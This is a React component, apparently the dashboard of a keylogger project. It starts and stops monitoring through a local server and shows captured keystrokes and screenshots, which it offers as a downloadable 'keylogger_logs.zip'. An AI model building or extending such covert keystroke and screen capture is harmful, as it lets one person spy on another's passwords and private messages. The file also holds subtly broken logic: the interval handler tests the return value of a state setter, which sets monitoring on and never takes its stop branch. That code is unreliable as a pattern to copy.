import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import React from "react";
import "./styles.css";

function MonitoringPanel() {
    const [isMonitoring, setIsMonitoring] = useState(false);
    const [keystrokes, setKeystrokes] = useState([]);
    const [screenshots, setScreenshots] = useState([]);
    const navigate = useNavigate();

    useEffect(() => {
        if (isMonitoring) {
            fetchLogs();
        }
    }, [isMonitoring]);

    const fetchLogs = async () => {
        try {
            const response = await fetch("http://127.0.0.1:5000/get_logs");
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            const data = await response.json();
            setKeystrokes(data.keystrokes || []);
            setScreenshots(data.screenshots || []);
        } catch (error) {
            console.error("Error fetching logs:", error);
        }
    };

    const startMonitoring = async () => {
        try {
            const response = await fetch("http://127.0.0.1:5000/start_monitoring", { method: "POST" });
            if (response.ok) {
                setIsMonitoring(true);
            }
        } catch (error) {
            console.error("Error starting monitoring:", error);
        }
    };

    const stopMonitoring = async () => {
        try {
            const response = await fetch("http://127.0.0.1:5000/stop_monitoring", { method: "POST" });
            if (response.ok) {
                setIsMonitoring(false);
            }
        } catch (error) {
            console.error("Error stopping monitoring:", error);
        }
    };

    const handleChangeInterval = async () => {
        if (setIsMonitoring(true)){
            await stopMonitoring();
            navigate("/settings");
        }

        else{
            navigate("/settings");
        }
        
    };

    const downloadLogs = async () => {
        try {
            const response = await fetch("http://127.0.0.1:5000/download_logs");
            if (!response.ok) throw new Error("Failed to download logs");
    
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = "keylogger_logs.zip"; // Download as ZIP
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        } catch (error) {
            console.error("Error downloading logs:", error);
        }
    };

    return (
        <>
            <button className="start-btn" onClick={startMonitoring}>Start Monitoring</button>
            <button className="stop-btn" onClick={stopMonitoring}>Stop Monitoring</button>
            <button className="change-interval-btn" onClick={handleChangeInterval}>Change Credentials</button>

            <div className="status">
                Status:{" "}
                <span className={isMonitoring ? "active" : "inactive"}>
                    {isMonitoring ? "Active 🟢" : "Inactive 🔴"}
                </span>
            </div>

            <h2>Keystrokes Log</h2>
            <div className="log-box">
                {keystrokes.length > 0 ? (
                    keystrokes.map((log, index) => <p key={index}>{log}</p>)
                ) : (
                    <p>No logs recorded yet.</p>
                )}
            </div>

            <h2>Captured Screenshots</h2>
            <div className="screenshot-gallery">
                {screenshots.length > 0 ? (
                    screenshots.map((img, index) => (
                        <img key={index} src={img} alt={`screenshot-${index}`} width="300px" />
                    ))
                ) : (
                    <p>No screenshots captured yet.</p>
                )}
            </div>

            <>
            <button className="download-btn" onClick={downloadLogs}>
                Download Logs
            </button>
            </>
        </>
    );
}

export default MonitoringPanel;
